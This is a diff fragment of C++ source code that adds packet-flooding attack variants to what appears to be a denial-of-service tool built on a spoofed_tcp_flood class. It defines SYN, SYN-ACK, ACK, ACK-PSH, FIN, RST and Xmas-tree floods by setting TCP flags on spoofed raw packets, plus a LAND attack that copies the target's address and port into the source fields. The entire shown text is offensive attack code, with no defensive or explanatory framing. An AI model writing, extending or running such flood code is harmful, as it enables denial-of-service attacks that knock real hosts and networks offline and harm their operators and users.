@@ -60,3 +60,56 @@ void spoofed_tcp_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
 
   tcp->th_sum = utils::csum((unsigned short *)&psh, sizeof(psh));
 }
+
+syn_flood::syn_flood() : spoofed_tcp_flood() {}
+
+syn_ack_flood::syn_ack_flood() : spoofed_tcp_flood() {}
+
+void syn_ack_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
+  tcp->th_flags = TH_SYN | TH_ACK;
+  spoofed_tcp_flood::finalize_hdr(tcp, ip);
+}
+
+ack_flood::ack_flood() : spoofed_tcp_flood() {}
+
+void ack_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
+  tcp->th_flags = TH_ACK;
+  spoofed_tcp_flood::finalize_hdr(tcp, ip);
+}
+
+ack_psh_flood::ack_psh_flood() : spoofed_tcp_flood() {}
+
+void ack_psh_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
+  tcp->th_flags = TH_ACK | TH_PUSH;
+  spoofed_tcp_flood::finalize_hdr(tcp, ip);
+}
+
+fin_flood::fin_flood() : spoofed_tcp_flood() {}
+
+void fin_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
+  tcp->th_flags = TH_FIN;
+  spoofed_tcp_flood::finalize_hdr(tcp, ip);
+}
+
+rst_flood::rst_flood() : spoofed_tcp_flood() {}
+
+void rst_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
+  tcp->th_flags = TH_RST;
+  spoofed_tcp_flood::finalize_hdr(tcp, ip);
+}
+
+xmas_flood::xmas_flood() : spoofed_tcp_flood() {}
+
+void xmas_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
+  tcp->th_flags = TH_SYN | TH_ACK | TH_FIN | TH_PUSH | TH_RST | TH_URG;
+  spoofed_tcp_flood::finalize_hdr(tcp, ip);
+}
+
+land::land() : spoofed_tcp_flood() {}
+
+void land::finalize_hdr(tcphdr *tcp, iphdr *ip) {
+  ip->saddr = ip->daddr;
+  tcp->th_flags = TH_SYN;
+  tcp->th_sport = tcp->th_dport;
+  spoofed_tcp_flood::finalize_hdr(tcp, ip);
+}
